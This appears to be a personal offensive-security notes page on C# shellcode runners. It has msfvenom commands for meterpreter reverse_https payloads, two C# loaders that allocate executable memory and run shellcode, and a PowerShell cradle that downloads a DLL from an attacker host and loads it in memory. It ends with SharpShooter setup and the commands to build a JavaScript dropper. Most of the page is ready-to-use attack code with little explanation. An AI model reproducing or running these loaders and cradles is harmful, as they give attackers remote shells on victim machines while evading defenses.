---
layout:     post
author:     0x5c4r3
type: docs
permalink: CSharp_Shellcode_Runner
---


<span style="font-size: 35px; color:red"><b>CSharp Shellcode Runner</b></span>
&nbsp;
Code for the reverrse_shell:
```shell
msfvenom  -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=<LPORT> -f csharp
```

To compile with Visual Studio as x64:
```cs
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
             byte[] buf = new byte[630] {0xfc,0x48,0x83,0xe4, //Change here

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```
&nbsp;

---
&nbsp;
<span style="color:white"><b>In-Memory Powershell Script</b></span>
In VS, create a new project as <span style="color:red">Class Library (.NET Framework)</span> that will output a .dll

```cs
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ClassLibrary1
{
    public class Class1
	{
	    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
	    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
	     uint flAllocationType, uint flProtect);

	    [DllImport("kernel32.dll")]
	    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
	      IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

	    [DllImport("kernel32.dll")]
	    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    public static void runner()
    {
            byte[] buf = new byte[630] {
  0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
  ...
  0x58,0xc3,0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5 }; //Change here

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

To then call the revshell from Powershell:
```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://<Attacker_IP>/ClassLibrary1.dll')

$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```
&nbsp;

---
&nbsp;
<span style="font-size: 35px; color:red"><b>SharpShooter</b></span>

https://github.com/mdsecactivebreach/SharpShooter.git

In order to make it work:
```shell
apt-get install virtualenv python3-autopep8 python2-setuptools-whl python2-setuptools-whl
cd /opt/; git clone https://github.com/mdsecactivebreach/SharpShooter.git
cd SharpShooter; pip install -r requirements.txt
autopep8 -i /opt/SharpShooter/modules/excel4.py
virtualenv sharpshooter-venv -p $(which python2)
wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
python get-pip.py
pip install -r requirements.txt
```

Create a revshell payload:
```shell
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=443 -f raw -o /var/www/html/shell.txt
```

Create the .js file with the following command:
```shell
sudo python SharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile /var/www/html/shell.txt --output test
```

It will create a test.js which is the exploit.

